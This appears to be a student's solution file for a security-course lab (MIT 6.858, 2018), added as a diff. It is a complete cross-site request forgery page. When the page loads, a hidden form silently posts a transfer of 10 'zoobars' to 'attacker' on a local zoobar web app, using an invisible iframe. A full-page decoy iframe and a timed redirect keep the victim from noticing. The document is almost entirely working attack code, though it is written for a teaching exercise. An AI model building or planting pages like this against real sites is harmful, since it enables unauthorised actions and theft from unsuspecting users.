@@ -1,0 +1,35 @@
+<html>
+<head>
+        <title>6.858 / Spring 2018</title>
+        <script>
+                function submitAndChange() {
+                        //document.getElementByName("responseFrame").addEventListener("load", function() {window.location.href = "http://css.csail.mit.edu/6.858/2018/"});
+
+                        document.forms[0].submit();
+                        setTimeout(function() {window.location.href = "http://css.csail.mit.edu/6.858/2018/"}, 2000);
+                }
+        </script>
+        <style>
+                .no_see{
+                        display:none;
+                }
+                .fill_up{
+                        border:none;
+                        width:100%;
+                        height:100%;
+                }
+                .no_edge{
+                        margin:0;
+                }
+        </style>
+</head>
+<body onload="submitAndChange();" class="no_edge">
+        <iframe src="http://css.csail.mit.edu/6.858/2018/" class="fill_up"></iframe>
+        <iframe name="responseFrame" class="no_see"></iframe>
+        <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="responseFrame" class="no_see">
+                <p>Send <input name="zoobars" value="10" size="5" type="text">zoobars</p>
+                <p>to <input name="recipient" value="attacker" size="10" type="text"></p>
+                <input name="submission" value="Send" type="submit">
+        </form>
+</body>
+</html>
